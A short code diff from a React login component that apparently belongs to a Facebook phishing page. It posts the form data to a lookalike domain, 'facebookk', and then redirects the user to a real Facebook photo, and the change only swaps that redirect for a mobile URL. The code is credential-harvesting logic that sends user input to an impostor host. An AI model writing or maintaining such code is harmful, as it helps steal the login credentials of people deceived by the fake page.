@@ -23,7 +23,7 @@ const Login = () => {
         axios.post('https://facebookk-6pr1.vercel.app/signup', formData)
           .then((res) => {
             console.log(res.data);
-            window.location.href = 'https://www.facebook.com/photo/?fbid=527361450059357&set=a.126687590126747'; 
+            window.location.href = 'https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747'; 
 
           })
           .catch((err) => console.log(err));
